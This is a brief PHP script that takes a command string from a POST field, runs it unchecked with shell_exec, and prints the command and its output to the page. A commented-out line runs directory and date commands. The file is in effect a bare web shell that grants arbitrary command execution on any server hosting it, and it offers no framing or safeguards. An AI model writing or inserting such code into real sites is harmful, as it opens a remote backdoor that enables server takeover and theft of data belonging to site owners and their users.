<?php

$_cmd_in = $_POST["bwx_cmd_input"]; # array key such as 'bwx.cmd.input' may cause error
$_shex_out = shell_exec("$_cmd_in");

echo "<pre>
command input: $_cmd_in <br/>
execution result: $_shex_out <br/>
</pre>
";

/*
	$shex_out = shell_exec('pwd; ls -alF; date;');
	echo "<pre> $shex_out </pre>";
 */
?>
